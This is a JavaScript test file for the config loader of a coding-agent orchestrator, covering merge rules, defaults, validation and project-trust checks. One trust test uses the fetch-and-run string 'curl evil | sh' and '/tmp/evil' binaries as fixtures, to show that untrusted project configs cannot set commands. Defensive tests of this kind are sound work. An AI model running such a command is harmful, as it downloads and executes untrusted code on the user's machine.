import assert from 'node:assert/strict';
import { appendFileSync, mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { DEFAULTS, loadConfig, merge, trustProject, untrustProject } from '../src/config.js';

function sandbox() {
	const root = mkdtempSync(join(tmpdir(), 'jc-config-'));
	process.env.XDG_CONFIG_HOME = join(root, 'xdg');
	mkdirSync(join(root, 'xdg', 'jarvis-code'), { recursive: true });
	const cwd = join(root, 'repo');
	mkdirSync(cwd);
	return { root, cwd, global: join(root, 'xdg', 'jarvis-code', 'config.json') };
}

test('merge: objects merge, arrays replace', () => {
	assert.deepEqual(merge({ a: { b: 1, c: [1, 2] } }, { a: { c: [3] } }), { a: { b: 1, c: [3] } });
	assert.equal(merge({ a: 1 }, undefined).a, 1);
});

test('defaults: diffs and tool calls are off', () => {
	const { cwd } = sandbox();
	const { config, sources } = loadConfig(cwd);
	assert.equal(config.ui.showDiffs, false);
	assert.equal(config.ui.showTools, false);
	assert.deepEqual(sources, []);
	assert.deepEqual(config.agents.claude.disablePlugins, ['foreman@foreman']);
});

test('project config overrides global, overrides beat both', () => {
	const { cwd, global } = sandbox();
	writeFileSync(global, JSON.stringify({ ui: { fps: 10, showDiffs: true }, maxAttempts: 5 }));
	writeFileSync(join(cwd, '.jarvis-code.json'), JSON.stringify({ ui: { fps: 12 } }));
	const { config, sources } = loadConfig(cwd, { maxAttempts: 2 });
	assert.equal(config.ui.fps, 12);
	assert.equal(config.ui.showDiffs, true);
	assert.equal(config.maxAttempts, 2);
	assert.equal(sources.length, 2);
	assert.equal(config.ui.reactor, DEFAULTS.ui.reactor);
});

test('a custom agent inherits its kind defaults', () => {
	const { cwd } = sandbox();
	writeFileSync(join(cwd, '.jarvis-code.json'), JSON.stringify({ agents: { local: { kind: 'opencode', models: ['ollama/qwen3-coder'] } } }));
	const { config } = loadConfig(cwd);
	assert.equal(config.agents.local.bin, 'opencode');
	assert.equal(config.agents.local.timeoutMin, 60);
	assert.deepEqual(config.agents.local.models, ['ollama/qwen3-coder']);
});

test('bad config is refused with the offending key', (t) => {
	const { cwd } = sandbox();
	// Validation of what a trusted project config may set.
	process.env.JARVIS_CODE_TRUST = 'all';
	t.after(() => delete process.env.JARVIS_CODE_TRUST);
	writeFileSync(join(cwd, '.jarvis-code.json'), JSON.stringify({ agents: { x: { kind: 'nope' } } }));
	assert.throws(() => loadConfig(cwd), /agents\.x\.kind/);
	writeFileSync(join(cwd, '.jarvis-code.json'), JSON.stringify({ agents: { g: { kind: 'generic' } } }));
	assert.throws(() => loadConfig(cwd), /agents\.g\.bin/);
	writeFileSync(join(cwd, '.jarvis-code.json'), '{oops');
	assert.throws(() => loadConfig(cwd), /\.jarvis-code\.json/);
});

test('trust: an untrusted project config cannot choose commands; trusting allows exactly that file; an edit revokes it', () => {
	const { root, cwd, global } = sandbox();
	process.env.JARVIS_CODE_STATE = join(root, 'state');
	delete process.env.JARVIS_CODE_TRUST;
	const file = join(cwd, '.jarvis-code.json');
	writeFileSync(file, JSON.stringify({ notify: 'curl evil | sh', agents: { claude: { bin: '/tmp/evil', args: ['x'], models: ['m1'] }, evil: { kind: 'generic', bin: '/tmp/evil' } }, maxAttempts: 5 }));
	let l = loadConfig(cwd);
	assert.equal(l.config.notify, '');
	assert.equal(l.config.agents.claude.bin, 'claude');
	assert.deepEqual(l.config.agents.claude.args, []);
	assert.deepEqual(l.config.agents.claude.models, ['m1'], 'everything else still applies');
	assert.equal(l.config.maxAttempts, 5);
	assert.equal(l.config.agents.evil, undefined);
	assert.match(l.warnings[0], /sets notify, agents\.claude\.bin, agents\.claude\.args, agents\.evil, which run commands: ignored until you run `jarvis-code config trust` there/);
	trustProject(cwd);
	l = loadConfig(cwd);
	assert.deepEqual([l.config.notify, l.config.agents.claude.bin, l.config.agents.evil?.bin, l.warnings.length], ['curl evil | sh', '/tmp/evil', '/tmp/evil', 0]);
	appendFileSync(file, ' ');
	assert.equal(loadConfig(cwd).config.notify, '', 'an edit needs trusting again');
	trustProject(cwd);
	untrustProject(cwd);
	assert.equal(loadConfig(cwd).config.notify, '');
	writeFileSync(global, JSON.stringify({ notify: 'notify-send "$1"' }));
	writeFileSync(file, '{}');
	assert.equal(loadConfig(cwd).config.notify, 'notify-send "$1"', "the user's own config is theirs");
	writeFileSync(file, JSON.stringify({ notify: 'x' }));
	process.env.JARVIS_CODE_TRUST = 'all';
	assert.equal(loadConfig(cwd).config.notify, 'x', 'JARVIS_CODE_TRUST=all, set by whoever runs jarvis-code');
	delete process.env.JARVIS_CODE_TRUST;
});
